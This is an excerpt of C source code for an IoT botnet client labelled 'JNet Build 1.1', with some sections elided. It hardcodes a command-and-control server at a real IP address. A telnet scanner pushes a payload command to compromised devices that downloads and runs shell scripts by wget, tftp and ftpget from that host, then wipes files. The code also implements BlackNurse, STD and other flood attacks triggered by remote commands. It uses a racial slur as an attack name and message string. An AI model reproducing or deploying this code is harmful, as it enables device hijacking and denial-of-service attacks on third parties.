/*
       ...
       _ _   _ ______ _______    _____ _      _____ ______ _   _ _______ 
      | | \ | |  ____|__   __|  / ____| |    |_   _|  ____| \ | |__   __|
      | |  \| | |__     | |    | |    | |      | | | |__  |  \| |  | |   
  _   | | . ` |  __|    | |    | |    | |      | | |  __| | . ` |  | |   
 | |__| | |\  | |____   | |    | |____| |____ _| |_| |____| |\  |  | |   
  \____/|_| \_|______|  |_|     \_____|______|_____|______|_| \_|  |_|   
...
#define JSERVER_LIST_SIZE (sizeof(JServer) / sizeof(unsigned char *))
#define PAD_RIGHT 1
#define PAD_ZERO 2
...
#define STD2_SIZE 69
#define moosagebytes 75
#define moosage "JNIGGA"
#define Version  "JNet Build 1.1"

//--------------------------------------------------------------------------------------------------------------------------------------
//--------------------------------------------------------------------------------------------------------------------------------------
//--------------------------------------------------------------------------------------------------------------------------------------

unsigned char *JServer[] = { "178.62.9.232:23" };

char *payload = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://178.62.9.232/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 178.62.9.232 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 178.62.9.232; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 178.62.9.232 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *";
char *payload2 = "cd /tmp; wget http://178.62.9.232/bins.sh; chmod 777 *; sh bins.sh; tftp -g 178.62.9.232 -r tftp.sh; chmod 777 *; sh tftp.sh; rm -rf *.sh";
...
void JScan(int wait_usec, int maxfds) {
			...
			case 8:
				{
                    ...
                    if(fds[i].tTimeout + 7 < time(NULL))  {
							send(fds[i].fd, payload, strlen(payload), MSG_NOSIGNAL);
...
void SendBlackNurse(unsigned char *ip, int end_time)
{
...
void SendJNIGGA(unsigned char *ip, int port, int secs) {
    int askdioawudhawd;
    ...
    while(1){
        if (a >= 50) {
            send(askdioawudhawd, moosage, moosagebytes, 0);
...
void SendSTD(unsigned char *ip, int port, int secs) {
    ...
    sin.sin_port = port;
    unsigned int a = 0;
	char *nibba = mkrndstr(15);
    while(1){
        if (a >= 50) {
			
            send(iSTD_Sock, nibba,  65, 0);
...
void processCmd(int argc, unsigned char *argv[]) {
		...
		if(!strcmp(argv[0], "BLACKNURSE"))
		{
			// !* BLACKNURSE TARGET TIME
		    if(argc < 3 || atoi(argv[2]) < 1)
			{
                return;
            }
			...
			if(strstr(ip, ",") != NULL)
			{
				...
				while(hi != NULL)
				{
					...
					hi = strtok(NULL, ",");
                        ...
                        SendBlackNurse(ip, time);
                        _exit(0);
           }
		}
		if(!strcmp(argv[0], "JNIGGA"))
		{
			// !* JNIGGA TARGET PORT TIME
...
int initConnection() {
	...
	if(currentServer + 1 == JSERVER_LIST_SIZE) currentServer = 0;
	else currentServer++;
	strcpy(server, JServer[currentServer]);
	int port = 23;
...
int main(int argc, unsigned char *argv[]) {
        ...
        if(JSERVER_LIST_SIZE <= 0) return 0;
